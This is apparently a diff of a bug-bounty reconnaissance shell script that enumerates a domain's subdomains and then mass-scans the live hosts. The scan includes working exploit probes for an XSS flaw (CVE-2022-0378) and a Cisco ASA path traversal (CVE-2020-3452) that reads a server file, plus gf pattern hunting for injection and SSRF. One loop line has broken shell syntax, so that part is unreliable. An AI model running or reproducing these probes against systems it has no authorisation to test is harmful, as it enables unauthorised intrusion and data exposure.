@@ -22,32 +22,25 @@ assetfinder --subs-only $domain | tee -a op.txt
 amass enum -passive -d $domain | tee -a op.txt
 amass enum -active -d $domain | tee -a amass_ips.txt
 crobat -s $domain | tee -a amass_ips.txt
+cat amass_ips.txt | awk '{print $1}' | tee -a op.txt
 
-
-cat op.txt | sort -u | anew all.txt 
-cat all.txt | httprobe | anew alive2.txt
-cat alive2.txt | sort -u | anew alive.txt
-cat alive.txt | jsubfinder | anew sn.txt
-
-
+cat op.txt | sort -u | tee -a all.txt 
+cat all.txt | httprobe | tee -a alive2.txt
+cat alive2.txt | sort -u | tee -a alive.txt
+cat alive.txt | jsubfinder | tee -a sn.txt
 
 cat alive2.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done | tee -a cve-2022-0378.txt
 while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < alive2.txt | tee -a cve-2020-3452.txt
 
-
-
-
-
 echo "checing for sub-domain TakeOver"
-subzy -targets all.txt -hide_fails | anew SubdomainTakeover.txt
+subzy -targets all.txt -hide_fails | tee -a SubdomainTakeover.txt
 
 echo "finding parameter and Next scan for xss"
 for i in $(cat all.txt);do ./tools/ParamSpider/paramspider.py -d $i ;done 
-cat output/*.txt | sort -u | anew paramspideroutput.txt
-rm -rf output
-echo "starting Cms Detection"
-whatweb -i alive.txt | anew whatweb_op.txt 
+cat output/*.txt | sort -u | tee -a paramspideroutput.txt
 
+echo "starting Cms Detection"
+whatweb -i alive.txt | tee -a whatweb_op.txt 
 
 
 cd
@@ -55,15 +48,15 @@ cd
 echo "GF patterns scan" 
 mkdir gfpatternsscan
 
-cat alive.txt | waybackurls | sort -u >> waybackdata.txt
-cat paramspideroutput.txt >> waybackdata.txt
+cat alive.txt | waybackurls | sort -u >> waybackdata
+cat paramspideroutput.txt >> waybackdata
 
-cat waybackdata.txt | gf redirect | anew gfpatternsscan/redirectGF.txt 
-cat waybackdata.txt | gf xss | anew gfpatternsscan/xssGF.txt
-cat waybackdata.txt | gf ssti | anew gfpatternsscan/sstiGF.txt
-cat waybackdata.txt | gf sqli | anew gfpatternsscan/sqliGF.txt
-cat waybackdata.txt | gf rce |  anew gfpatternsscan/rceGF.txt
-cat waybackdata.txt | gf ssrf | anew gfpatternsscan/ssrfparamsGF.txt
+cat waybackdata | gf redirect | anew gfpatternsscan/redirectGF.txt 
+cat waybackdata | gf xss | anew gfpatternsscan/xssGF.txt
+cat waybackdata | gf ssti | anew gfpatternsscan/sstiGF.txt
+cat waybackdata | gf sqli | anew gfpatternsscan/sqliGF.txt
+cat waybackdata | gf rce |  anew gfpatternsscan/rceGF.txt
+cat waybackdata | gf ssrf | anew gfpatternsscan/ssrfparamsGF.txt
 
 
 
